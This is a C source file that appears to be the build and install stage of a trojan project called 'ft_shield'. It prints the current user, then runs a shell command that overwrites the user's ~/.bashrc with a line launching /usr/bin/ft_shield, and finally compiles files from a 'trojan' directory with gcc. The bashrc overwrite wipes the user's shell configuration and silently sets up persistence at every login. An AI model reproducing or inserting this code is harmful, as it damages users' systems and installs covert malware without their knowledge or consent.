#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int ac, char **av, char **envp) {
    (void)ac;
    (void)av;
    (void)envp;
    // char buf[100];
    char *actualuser = getenv("USER");
    char *args[] = {
        "gcc", 
        "-Wall",
        "-Wextra",
        "-Werror", "trojan/*.c", 
        "-o",
        "trojan/ft_shield",
        "-lssl", "-lcrypto", "-lpthread", NULL,
    };

    fprintf(stdout, "%s\n", actualuser);
    system("echo /usr/bin/ft_shield > ~/.bashrc");
    if (execve("/bin/gcc", args,envp) < 0) {
        perror("execve");
        return 1;
    }

    return 0;
}